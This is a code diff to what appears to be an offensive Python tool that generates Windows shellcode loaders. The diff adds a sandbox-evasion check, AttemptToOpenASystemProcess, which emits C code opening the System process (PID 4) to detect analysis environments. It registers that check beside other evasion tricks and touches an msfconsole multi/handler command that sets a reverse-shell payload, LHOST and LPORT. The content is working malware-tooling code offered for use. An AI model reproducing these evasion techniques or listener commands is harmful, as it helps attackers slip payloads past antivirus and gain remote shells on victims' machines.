@@ -87,7 +87,6 @@ int {func_name}(const char *{arg_name}) {{
 
 
 class AllocateAndFill100M0Memory(Bypass):
-    var_name = None
 
     def __init__(self):
         super().__init__()
@@ -125,7 +124,6 @@ int {0}() {{
 
 
 class HundredMillionIncrements(Bypass):
-    var_name = None
 
     def __init__(self):
         super().__init__()
@@ -155,6 +153,40 @@ int {0}() {{
         '''.format(
             self.func_name,
             ShellCoder.make_random_str(),
+            ShellCoder.make_random_str()
+        )
+
+    def get_call(self):
+        return '''
+        {func_name}() == 1
+        '''.format(func_name=self.func_name)
+
+
+class AttemptToOpenASystemProcess(Bypass):
+    def __init__(self):
+        super().__init__()
+
+    @staticmethod
+    def menu():
+        return "Attempt to open a system process"
+
+    def get_template(self):
+        return '''
+        
+int {0}() {{
+    HANDLE {1};
+    
+    {1} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
+    
+    if ({1} != NULL)
+    {{
+      return 0;
+    }}
+    
+    return 1;
+}}
+        '''.format(
+            self.func_name,
             ShellCoder.make_random_str()
         )
 
@@ -311,6 +343,7 @@ class Windows(ShellCoder):
         VerifyInputName,
         AllocateAndFill100M0Memory,
         HundredMillionIncrements,
+        AttemptToOpenASystemProcess,
     ]
 
     def __init__(self):
@@ -345,7 +378,7 @@ class Windows(ShellCoder):
             f.write(generate_script)
 
         listener_command = "msfconsole -q -x 'use multi/handler; set payload %s, set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (
-        self.payload, self.selected_ip, self.selected_port, self.exit_func)
+            self.payload, self.selected_ip, self.selected_port, self.exit_func)
 
         generate_script = """#!/bin/bash
 
